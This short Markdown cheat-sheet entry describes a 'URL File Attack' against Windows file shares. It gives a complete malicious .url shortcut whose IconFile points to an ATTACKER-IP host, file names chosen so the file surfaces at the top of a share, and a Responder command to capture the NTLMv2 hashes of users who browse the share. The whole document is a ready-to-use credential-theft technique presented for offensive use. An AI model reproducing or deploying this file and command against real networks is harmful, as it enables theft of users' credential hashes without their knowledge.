# URL File Attack

- If we have a user that has all kind of share access we can add this to one of the shares 
  ```
  [InternetShortcut]
  URL=whatever
  WorkingDirectory=whatever
  IconFile=\\ATTACKER-IP\%USERNAME%.icon
  IconIndex=1
  ```
- We have to save it as `"@test.url"` or `"~test.url"`
- We launch responder in our attacking machine `responder -I eth0 -v`
- We get NTLMv2 hashes
